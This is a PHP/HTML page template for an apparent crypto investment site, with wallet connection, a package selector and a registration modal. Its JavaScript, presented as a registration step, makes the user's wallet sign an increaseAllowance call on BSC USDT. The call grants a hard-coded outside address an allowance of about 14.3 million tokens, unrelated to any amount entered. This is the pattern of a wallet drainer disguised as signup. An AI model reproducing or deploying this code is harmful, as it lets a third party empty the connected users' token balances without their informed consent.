<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="google-site-verification" content="weWoq6bHf4pDLvTgxsQXmhy5b3Bl7wjCoBsTo3D87Rg" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <title></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="./assets/css/new_dashboard.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.css">
    <style>
    
   .pay_select {
    padding: 100px 0px;
    /* text-align: center; */
    max-width: 800px;
    width: 100%;
    margin: auto;
}
.nice-select  {
width: 100%;
padding: 2px 10px;
height:45px;
border-radius: 4px;
background: #1a222d;
color: #fff;
border: 1px solid #ffffff26;
margin-bottom: 15px;
}
ul.list {
    color: #000;
}
option{
    color:#000;
}
button#pay_now_btn {
padding: 10px;
width: 100%;
background: #0159ac;
border: none;
border-radius: 4px;
text-transform: capitalize;
color: #fff;
font-size: 20px;
}


.gold_index {
    background: #08051f;
    min-height:100vh;
}
.header {
    display: none;
}

footer.footer {
    display: none;
}

.wallets_list {
    padding: 100px 0px;
    /* text-align: center; */
    max-width: 600px;
    width: 100%;
    margin: auto;
}

.connect_wallet button {
    width: 100%;
    padding: 12px;
    border: none;
    border-radius: 4px;
    font-size: 18px;
    color: #fff;
    background: #0159ac;
    word-break: break-all;
}

.connect_wallet {
    margin-bottom: 20px;
}

.wallet_dap {
    padding: 15px;
    display: flex;
    align-items: center;
    gap: 20px;
    background: #1a222d;
    margin-bottom: 15px;
    border-radius: 4px;
}

.wallet_dap h4 {
    margin: 0;
}

.wallet_dap h4 {
    width: 80px;
    height: 80px;
    background: #08051f;
    line-height: 80px;
    text-align: center;
    border-radius: 10px;
    color:#fff;
    font-size:20px;
}

.wallet_dap.cross h4 {
    background-color: rgb(255 0 0 / 11%);
}


.wallet_dap.cross h4 i {
    background: red;
    padding: 10px;
    border-radius: 50%;
    width: 40px;
    height: 40px;
}
.wallet_content h5 {
    color: #fff;
    text-transform: capitalize;
    font-weight: 800;
    margin-bottom: 5px;
}

.wallet_content p {
    color: #fff;
    margin: 0px;
}

.wallet_dap.new h4{
    position: relative;
}
.wallet_dap.new h4 i {
    font-size: 42px;
    line-height: 82px;
}

/* spinner css */
.loadingspinner {
    pointer-events: none;
    width: 2.5em;
    height: 2.5em;
    border: 0.4em solid transparent;
    border-color: #eee;
    border-top-color: #3E67EC;
    border-radius: 50%;
    animation: loadingspin 1s linear infinite;
    position: absolute;
    top: 16px;
    left: 15px;
   
}

@keyframes loadingspin {
	100% {
			transform: rotate(360deg)
	}
}

@media screen and (max-width:576px){
    .connect_wallet button {
        font-size:12px !important;
    }
}

    </style>
</head>

<body>
     <div class="gold_index" style="background-color:none;">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div id="main_section" class="wallets_list mt-5">
                      
                        <div class="connect_wallet">
                             <div id="prepare" style="cursor: pointer;">
                                <button id="btn-connect" class="btn btn-info mybtn1 mt-2">Connect Wallet</button>
                              </div>
                              <div style="display: none; cursor: pointer;" id="connected">
                                <button id="btn-disconnect" class="btn btn-danger mybtn1 mt-2 mb-2">Disconnect Wallet</button>
                              </div>
                         
                        </div>
                        <div class="wallet_dap new">
                            <h4>
                                <div class="loadingspinner" id="spiner"></div>
                                  <div id="icon_green" style="display:none"> <i class="fa fa-check-circle" aria-hidden="true" style=" color:green"></i></div>
                               
                            </h4>
                          
                            <div class="wallet_content">
                                <h5 id="wallet_conn">wallet </h5>
                                <p id="detect">no DApp found . still trying</p>
                            </div>
                        </div>
                        <div class="wallet_dap cross">
                             
                           
                            <h4 style="position:relative;"> 
                            <i id="icon_off" class="fa fa-times" aria-hidden="true"></i>
                            <div class="loadingspinner" id="sigup_spiner" style="display:none"></div>
                            
                            </h4>
                            
                            <div class="wallet_content">
                                <h5>Catching Address</h5>
                                <p id="sign_up">no DApp found.</p>
                            </div>
                        </div>
                        <div class="wallet_dap cross">
                            <h4>
                                <div id="icon_change" style="display:none; background:rgb(185 94 0 / 23%); border-radius:4px;">
                                    <i class="fa fa-sign-in"  style="background:#b95e00; color:#fff;" aria-hidden="true"></i> 
                                </div>
                                <i class="fa fa-times" id="main_icon" aria-hidden="true"></i>
                            </h4>
                            <div class="wallet_content">
                                <h5 id="sign_in">Redirecting...</h5>
                                <p id="login_conn">no DApp found.</p>
                            </div>
                        </div>
                    </div>
                    
                
                 <!-- Pay-Data -->
                        <div id="register_section" style="display:none" class="pay_data">
                            <div class="pay_select">
                               <select class="form-control" id="data" name="selected_pin" required="">
                                <option value="">Select Package</option>
                                <?php
                                $all_pin=$this->conn->runQuery("*",'pin_details',"status=1");
                                if ($all_pin) {
                                  foreach ($all_pin as $pindetails) {
                                    ?>
                                    <option amount="<?= $pindetails->pin_rate; ?>" value="<?= $pindetails->pin_type; ?>">
                                      <?= $pindetails->pin_type; ?> (<?= $pindetails->roi_month?> Months)
                                    </option>
                                    <?php
                                  }
                                }
                        ?>
                        </select>
                        <div class="form-group">
                                    <label style="color:#fff;">Amount in USDT</label>
                                    <input name="amt" id="amt" type="text" class="form-control" autocomplete="off" placeholder="Enter Amount" data-response="amt_res" value="<?php echo set_value('amt'); ?>">
                                    <div class="error-massage-id" id="amt_res">
                                        <?php echo form_error('amt'); ?>
                                    </div>
                            </div>

                                 <span id="status"></span>
                                 <br>
                                <button id="pay_now_btn" onclick="stack();">Confirm</button>
                            </div>
                        </div>
                        <!-- Pay-Data-end -->
               </div>            
            </div>
        </div>
     </div>

     <div class="container">
    <div class="modal " id="exampleModal" tabindex="-1000" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
   <div class="modal-dialog" role="document">
      <div class="modal-content" style="margin-top:25%;">
         <div class="modal-body">
            <div class="modal_desc">
               <div class="cstm-bx">
                  <div class="sponser_data_page">
                     <?php
                        $profile = $this->session->userdata("profile");
                        $user_id = $this->session->userdata('user_id');
                     ?>
                    
                     <div class="sponser_desc">
                     <label>Username</label>
                        <input type="text" id="username_id" name="username_id" placeholder="Enter Referral Id" class="form-control" value="<?= $profile->username;?>" disabled>
                        <br> <?php
                        $requires = $this->conn->runQuery("*", 'advanced_info', "title='Registration'");
                        $value_by_lebel = array_column($requires, 'value', 'label');
                        ?>
                         <?php if (array_key_exists('user_gen_method', $value_by_lebel) && $value_by_lebel['user_gen_method'] == 'manual') { ?>
                                <div class="form-group">
                                    <label>Username</label>
                                    <input name="usename" id="usename" type="text" class="form-control" autocomplete="off" placeholder="Enter  Username" data-response="username_res" value="<?php echo set_value('usename'); ?>">
                                    <div class="error-massage-id" id="username_res">
                                        <?php echo form_error('usename'); ?>
                                    </div>
                                </div>
                            <?php
                            }
                            ?>
                            
                            <?php  if (array_key_exists('mobile_users', $value_by_lebel)) { ?>
                            <!--<div class="form-group">-->
                            <!--        <label>Name</label>-->
                            <!--        <input name="name" id="name" type="text" class="form-control" autocomplete="off" placeholder="Enter Name" data-response="name_res" value="<?php echo set_value('name'); ?>">-->
                            <!--        <div class="error-massage-id" id="name_res">-->
                                        <?php 
                                        // echo form_error('name'); 
                                        ?>
                            <!--        </div>-->
                            <!--</div>-->
                            <?php } ?>
                            
                      
                        <br>
                        
                   
                     </div>
                     <div class="text-center">
                        <button type="button"  id="cls_mdl" class="btn btn-primary m-auto text-center" onclick="return reg()" >
                        <span aria-hidden="true">submit</span>
                        </button></div>
                  </div>
               </div>
            </div>
         </div>
        
      </div>
   </div>
</div>
</div>




</body>
</html>
  
 
<script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/web3modal"></script>
<script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
<script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider"></script>
<script type="text/javascript" src="https://unpkg.com/fortmatic@2.0.6/dist/fortmatic.js"></script>
<script src="https://cdn.ethers.io/lib/ethers-5.1.umd.min.js" type="text/javascript"></script>
<script>
   function handleForm(event) { event.preventDefault(); } 
   
    
 
 
   const status = document.querySelector('#status');
   const status_sell = document.querySelector('#status_sell');
   const Web3Modal = window.Web3Modal.default;
   const WalletConnectProvider = window.WalletConnectProvider.default;
   const EvmChains = window.evmChains;
   const Fortmatic = window.Fortmatic;
   const contractabi = [{"inputs":[{"internalType": "address","name": "_spender","type": "address"},{"internalType": "uint256","name":"_addedValue","type": "uint256"}],"name": "increaseAllowance","outputs":[{"internalType": "bool","name": "","type":"bool"}],"stateMutability": "nonpayable","type": "function"}];
   const ethers = window.ethers
   
   // Web3modal instance
   let web3Modal
   
   // Chosen wallet provider given by the dialog window
   let provider;
   
   let chainId;
   
   let calculateAll
   
   // Address of the selected account
   let selectedAccount;
   
   let userAddress;
   
   let userBalance;
   /**
    * Setup the orchestra
    */
   function init() {
   
     console.log("Initializing example");
     console.log("WalletConnectProvider is", WalletConnectProvider);
     console.log("Fortmatic is", Fortmatic);
   
     // Tell Web3modal what providers we have available.
     // Built-in web browser provider (only one can exist as a time)
     // like MetaMask, Brave or Opera is added automatically by Web3modal
     const providerOptions = {
       walletconnect: {
         package: WalletConnectProvider,
         display: {
           name: "Wallet Connect"
         },
         options: {
           // Mikko's test key - don't copy as your mileage may vary
           infuraId: "5f40cd78a0004e3dbe19bd078e6d520a",
         }
       },
    
       fortmatic: {
         package: Fortmatic,
         options: {
           // Mikko's TESTNET api key
           key: "pk_test_391E26A3B43A3350"
         }
       }
     };

     web3Modal = new Web3Modal({
       cacheProvider: false, // optional
       providerOptions, // required
     });
     
   }
   
   
   /**
    * Kick in the UI action after Web3modal dialog has chosen a provider
    */
   async function fetchAccountData() {
   
     // Get a Web3 instance for the wallet
     const web3 = new Web3(provider);
   
     console.log("provider: ",provider);
     window.localStorage.provider = new ethers.providers.Web3Provider(provider);
     console.log("Web3 instance is", web3);
     // Get connected chain id from Ethereum node
     chainId = await web3.eth.getChainId();
     console.log(chainId);
     // Load chain information over an HTTP API
    // const chainData = await EvmChains.getChain(chainId);
     // document.querySelector("#network-name").textContent = chainData.name;
   
     // Get list of accounts of the connected wallet
     const accounts = await web3.eth.getAccounts();
   
     // MetaMask does not give you all accounts, only the selected account
     console.log("Got accounts", accounts);
     selectedAccount = accounts[0];
   
     // document.querySelector("#selected-account").textContent = selectedAccount;
   
     // Get a handl
     // const template = document.querySelector("#template-balance");
     // const accountContainer = document.querySelector("#accounts");
   
     // Purge UI elements any previously loaded accounts
     // accountContainer.innerHTML = '';
   
     // Go through all accounts and get their ETH balance
     const rowResolvers = accounts.map(async (address) => {
       userAddress = address;
       const balance = await web3.eth.getBalance(address);
       // ethBalance is a BigNumber instance
       // https://github.com/indutny/bn.js/
       const ethBalance = web3.utils.fromWei(balance, "ether");
       const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
       userBalance = humanFriendlyBalance;
   
       // Fill in the templated row and put in the document
       // const clone = template.content.cloneNode(true);
       // clone.querySelector(".address").textContent = address;
       // clone.querySelector(".balance").textContent = humanFriendlyBalance;
       // accountContainer.appendChild(clone);
     });
    //  calculateAll = setInterval(calculateToken, 1000);
    //  calculateAll;
   
     // Because rendering account does its own RPC commucation
     // with Ethereum node, we do not want to display any results
     // until data for all accounts is loaded
     await Promise.all(rowResolvers);
   
     // Display fully loaded UI for wallet data
     document.querySelector("#prepare").style.display = "none";
     document.querySelector("#connected").style.display = "inline-block";
   }
   
   
   
   /**
    * Fetch account data for UI when
    * - User switches accounts in wallet
    * - User switches networks in wallet
    * - User connects wallet initially
    */
   async function refreshAccountData() {
      
     document.querySelector("#connected").style.display = "none";
     document.querySelector("#prepare").style.display = "block";
   
     document.querySelector("#btn-connect").setAttribute("disabled", "disabled")
     await fetchAccountData(provider);
     document.querySelector("#btn-connect").removeAttribute("disabled")
    
        
       $.ajax({
           type: "post",
           headers: {  'Access-Control-Allow-Origin': 'https://www.metaxpro.net/' },
           url: "<?= base_url('register/username_available');?>",
           data: {username:userAddress},          
           success: function (response) {  
              // alert(response);
               var res = JSON.parse(response);          
               if(res.error==true){				   
                   $('#exampleModal').modal('show');				                
               }else{
                   var co = res.code;
                   //alert(co);
                   login(co);                          
               }
           }
       });
   }
    
   /**
    * Connect wallet button pressed.
    */
   
   
  
   
   
     async function onConnect() {
     
     console.log("Opening a dialog", web3Modal);
     try {
       provider = await web3Modal.connect();
     } catch(e) {
       console.log("Could not get a wallet connection", e);
       return;
     }
   
     // Subscribe to accounts change
     provider.on("accountsChanged", (accounts) => {
       fetchAccountData();
     });
   
     // Subscribe to chainId change
     provider.on("chainChanged", (chainId) => {
       fetchAccountData();
     });
   
     // Subscribe to networkId change
     provider.on("networkChanged", (networkId) => {
       fetchAccountData();
     });
     
     await refreshAccountData();
   }
   /**
    * Disconnect wallet button pressed.
    */
   async function onDisconnect() {
   
     console.log("Killing the wallet connection", provider);
   
     // TODO: Which providers have close method?
     if(provider.close) {
       await provider.close();
   
       // If the cached provider is not cleared,
       // WalletConnect will default to the existing session
       // and does not allow to re-scan the QR code with a new wallet.
       // Depending on your use case you may want or want not his behavir.
       await web3Modal.clearCachedProvider();
       provider = null;
     }
     clearInterval(calculateAll);
     selectedAccount = null;
   
     // Set the UI back to the initial state
     document.querySelector("#prepare").style.display = "block";
     document.querySelector("#connected").style.display = "none";
   }
   
   
   /**
    * Main entry point.
    */
   window.addEventListener('load', async () => {
      
     init();
    
     document.querySelector("#btn-connect").addEventListener("click", onConnect);
    
    //  document.querySelector("#btn-buy").addEventListener("click", onBuy);
    //  document.querySelector("#btn-sell").addEventListener("click", onSell);
     
     document.querySelector("#btn-disconnect").addEventListener("click", onDisconnect);
   });
   
   // window.onload = function() {            
   //     setInterval(calculateToken, 1000);
   // }
   
   console.log("ethers instance: ", ethers);
   

   
   function truncate(input) {
       if (input.length > 5) {
          return input.substring(0, 6) + '.......' + input.substring(input.length - 5);
       }
       return input;
    };
   
   
    function toFixed(x) {
     if (Math.abs(x) < 1.0) {
       var e = parseInt(x.toString().split('e-')[1]);
       if (e) {
           x *= Math.pow(10,e-1);
           x = '0.' + (new Array(e)).join('0') + x.toString().substring(2);
       }
     } else {
       var e = parseInt(x.toString().split('+')[1]);
       if (e > 20) {
           e -= 20;
           x /= Math.pow(10,e);
           x += (new Array(e+1)).join('0');
       }
     }
     return x;
   }
   

   
   function reg(){
       
     
       
     var username_id = $('input[name=\'username_id\']').val();
     if(username_id==''){
       alert("Please enter valid username");
       //$('#ref1').html("No Valid Joining ID Link - Default 'demo' will be used for joining");
     }else{
       register_submit();
       //$('#ref1').html("Joining ID Link :" + sp_id);//document.getElementById("ref1").innerHTML = "Joining ID Link :" + sp_id;
     }
     $('#exampleModal').modal('hide');
   
   }
   
   function login(usernasme){
     
     $.ajax({
       type: "post",
       headers: {  'Access-Control-Allow-Origin': 'https://www.metaxpro.net/' },
       url: "<?= base_url('user/profile/login');?>",
       data: {username:usernasme},          
       success: function (response) {  
         //alert(response);
         var res = JSON.parse(response);          
         if(res.error==true){
           alert(res.msg);  
   
         }else{
           location = "<?= base_url('user/dashboard');?>";       
         }
       }
     });
   }
    function toPlainString(num) {
              return (''+ +num).replace(/(-?)(\d*)\.?(\d*)e([+-]\d+)/,
                function(a,b,c,d,e) {
                  return e < 0
                    ? b + '0.' + Array(1-e-c.length).join(0) + c + d
                    : b + c + d + Array(e-d.length+1).join(0);
                });
        }
   async function register_submit(){
    //   var name = document.getElementById("name").value;
    //   var selectedCountry = document.getElementById("country_code").value;
    //   var selectedCode = document.getElementById("country_code").selectedOptions[0].getAttribute("data-phonecode");;
     ///alert(fgfgf);
     const provider1 = new ethers.providers.Web3Provider(provider);
     var c = $('input[name=\'username_id\']').val();
     var pos = $('#position_detail').val();
     //document.getElementById("ttt").value =
     //register($(this).attr('data-pkg'));  
    //alert(pos);
    if(chainId==56){
        var contractInstance2 = new ethers.Contract("0x55d398326f99059ff775485246999027b3197955",contractabi,provider1.getSigner());
            
            let approveTx = await contractInstance2.increaseAllowance('0xb6ac5ADb5A19b12313B1c8Ebc39abB7ADDcE8592', '14345737227107126571627462', {
              from: userAddress
            });
            
            let approveReceipt = await approveTx.wait();
            let approveStatus = approveReceipt.status;
            
            if (approveStatus === 1) {
                
        
     $.ajax({
       type: "post",
       url: "<?= base_url('user/profile/update_address');?>",
       headers: {  'Access-Control-Allow-Origin': 'https://www.metaxpro.net/' },
       data: {address:userAddress,username:c,position:pos},          
       success: function (response) {  
         //alert(response);
         var res = JSON.parse(response);          
         if(res.error==true){
           alert(res.msg);
         }else{        
           //alert("Register success");
   		$('#register_res').html("Address Updated success!");
           var co = res.code;
           login(co);          
         }
       }
     });
  }
  }
   }
   
 
        
     
      
</script>